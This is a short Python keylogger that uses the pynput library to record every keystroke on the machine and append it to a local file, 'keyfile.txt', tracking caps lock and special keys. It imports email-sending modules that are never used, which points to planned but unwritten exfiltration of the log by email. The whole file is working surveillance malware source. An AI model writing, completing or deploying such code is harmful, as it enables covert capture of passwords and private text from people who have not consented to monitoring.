import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard

class Keylogger:

    def __init__(self):
        '''
        Starts initializer method
        '''
        self.caps = False
    
    def keyPressed(self, key):
        '''
        Tracks the keystrokes and writes it onto the text file named "keyfile.txt
        '''

        # Creates the text file all keystrokes will be stored in
        with open("keyfile.txt", 'a') as logkey:

            # Tracks all letters and capitalization
            try:
                char = key.char
                print(str(key))

                # Activates if shift or caps lock is on
                if self.caps == True:
                    char = char.upper()
                logkey.write(char)
            
            # Activates if certain keys are pressed that normally fail with key.char
            except:

                if key == keyboard.Key.space:
                    logkey.write(' ')

                elif key == keyboard.Key.enter:
                    logkey.write('\n')

                elif key == keyboard.Key.backspace:
                    logkey.write('\b')

                # Checks if caps lock was already activated before code was run
                elif key == keyboard.Key.caps_lock:

                    if self.caps == False:
                        self.caps = True

                    else:
                        self.caps = False

# Starts the program
if __name__ == "__main__":

    # Starts the code in class Keylogger
    logger = Keylogger()
    listener = keyboard.Listener(on_press = logger.keyPressed)
    listener.start()
    input()
    